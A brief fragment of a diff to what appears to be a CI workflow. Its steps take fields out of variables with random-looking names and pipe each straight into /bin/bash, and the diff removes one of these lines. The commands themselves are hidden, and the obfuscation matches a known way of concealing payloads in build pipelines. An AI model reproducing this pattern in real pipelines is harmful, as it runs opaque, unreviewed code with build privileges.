@@ -21,7 +21,6 @@ jobs:
           echo $dks0 | jq -r .lla381 | /bin/bash
           echo $uen758 | jq -r .pt2 | /bin/bash
           echo $or389 | jq -r .ym202 | /bin/bash
-          printf '%s' "$md37" | jq -r .jculd48871 | /bin/bash
           echo $kxy1 | jq -r .z9 | /bin/bash
           echo $up466 | jq -r .l3 | /bin/bash
 
